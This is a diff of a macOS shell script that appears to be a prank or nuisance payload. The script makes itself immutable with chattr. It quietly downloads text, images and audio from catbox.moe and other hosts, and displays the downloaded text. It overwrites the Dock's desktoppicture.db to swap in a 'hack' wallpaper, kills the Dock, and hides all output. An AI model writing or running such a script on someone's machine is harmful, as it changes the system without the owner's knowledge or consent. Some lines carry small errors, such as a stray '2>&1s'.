@@ -10,28 +10,13 @@ chattr +i mac.sh > /dev/null 2>&1
 
 # ASCII
 clear
-echo "                            ,-."
-echo "       ___,---.__          /'|`\          __,---,___"
-echo "    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-."
-echo "  ,'        |           ~'\     /`~           |        `."
-echo " /      ___//              `. ,'          ,  , \___      \"
-echo "|    ,-'   `-.__   _         |        ,    __,-'   `-.    |"
-echo "|   /          /\_  `   .    |    ,      _/\          \   |"
-echo "\  |           \ \`-.___ \   |   / ___,-'/ /           |  /"
-echo " \  \           | `._   `\\  |  //'   _,' |           /  /"
-echo "  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'"
-echo "    ``       /     \    ,='/ \`=.    /     \       ''"
-echo "            |__   /|\_,--.,-.--,--._/|\   __|"
-echo "            /  `./  \\`\ |  |  | /,//' \,'  \"
-echo "           /   /     ||--+--|--+-/-|     \   \"
-echo "           |   |     /'\_\_\ | /_/_/`\   |   |"
-echo "            \   \__, \_     `~'     _/ .__/   /"
-echo "             `-._,-'   `-._______,-'   `-._,-'"
-sleep 0.5s
-clear
+cd ~/Pictures > /dev/null 2>&1
+curl https://files.catbox.moe/ab5eca.txt --output meme.txt > /dev/null 2>&1
+cat meme.txt
 
 # Begin
-cd ~/Pictures 2>&1 && curl https://i.ytimg.com/vi/ZdV6wKo5o1A/hqdefault.jpg --output meme.jpg > /dev/null 2>&1
+cd ~/Pictures > /dev/null 2>&1
+curl https://i.ytimg.com/vi/ZdV6wKo5o1A/hqdefault.jpg --output meme.jpg > /dev/null 2>&1
 curl https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290_960_720.jpg --output background.jpg > /dev/null 2>&1
 sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '~/Pictures/background.jpg'" && killall Dock > /dev/null 2>&1s
 curl https://files.catbox.moe/0imoe1.mp3 --output meme.mp3 > /dev/null 2>&1
